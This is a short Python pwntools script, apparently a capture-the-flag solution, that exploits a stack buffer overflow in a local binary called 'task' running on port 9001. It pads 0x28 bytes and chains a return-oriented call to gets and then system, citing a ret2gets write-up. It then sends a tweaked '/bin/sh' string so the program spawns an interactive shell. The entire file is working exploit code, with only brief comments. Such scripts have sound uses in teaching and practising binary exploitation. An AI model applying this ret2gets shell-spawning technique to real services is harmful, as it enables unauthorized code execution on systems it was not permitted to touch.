#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#controlling-rdi

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.call("gets")
rop.call("system")
p.sendline(rop.chain())

# both of these work but the second is more precisely addressing the decrement of the 5th byte
#p.sendline(b"//////bin/sh\x00")
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")

p.interactive()
